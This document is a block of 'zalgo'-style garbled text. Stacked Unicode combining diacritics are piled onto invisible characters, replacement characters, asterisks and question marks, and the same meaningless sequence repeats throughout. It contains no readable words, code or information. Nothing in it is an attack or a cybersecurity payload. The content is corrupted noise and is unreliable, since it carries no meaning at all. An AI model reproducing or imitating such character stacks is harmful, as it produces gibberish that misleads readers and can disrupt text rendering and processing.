̧̡̩̣̥͕̗̫̞̥̱̦̲̝̯͜�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̚͡͝͠